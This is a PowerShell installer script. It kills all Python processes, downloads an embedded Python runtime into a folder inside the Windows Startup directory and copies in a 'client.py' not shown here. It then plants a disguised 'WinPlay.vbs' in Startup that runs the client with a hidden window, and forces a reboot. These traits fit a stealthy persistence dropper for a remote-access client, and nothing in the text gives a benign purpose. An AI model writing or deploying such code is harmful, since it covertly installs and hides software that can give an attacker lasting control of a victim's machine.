$scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Definition
Set-Location $scriptPath
$clientPath = Join-Path -Path $scriptPath -ChildPath "client.py"
$autostartPath = [environment]::getfolderpath("Startup")
Set-Location $autostartPath
Taskkill /IM python.exe /F
Remove-Item .\temp -Recurse -Force -ErrorAction SilentlyContinue
New-Item temp -ItemType Directory
Set-Location .\\temp
Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.12.5/python-3.12.5-embed-amd64.zip -OutFile python-3.12.5-embed-amd64.zip
Expand-Archive .\\python-3.12.5-embed-amd64.zip
Set-Location .\\python-3.12.5-embed-amd64
Set-Location ..
Start-Sleep -Seconds 1
Rename-Item .\python-3.12.5-embed-amd64\ .venv
Remove-Item .\python-3.12.5-embed-amd64.zip
Copy-Item $clientPath .\client.py
Set-Location ..

New-Item .\\WinPlay.vbs

Set-Content -Path .\\WinPlay.vbs -Value @"
Set objShell = CreateObject("WScript.Shell")

pythonExePath = "$autostartPath\\temp\\.venv\\python.exe"
pythonScriptPath = "$autostartPath\\temp\\client.py"

fullCommand = Chr(34) & pythonExePath & Chr(34) & " " & Chr(34) & pythonScriptPath & Chr(34)

objShell.Run fullCommand, 0, False
"@


#New-Item -Path "start.bat" -ItemType File -Value ".\temp\.venv\python.exe .\temp\client.py"
#Start-Process -FilePath "start.bat" -WindowStyle Hidden

Restart-Computer -Force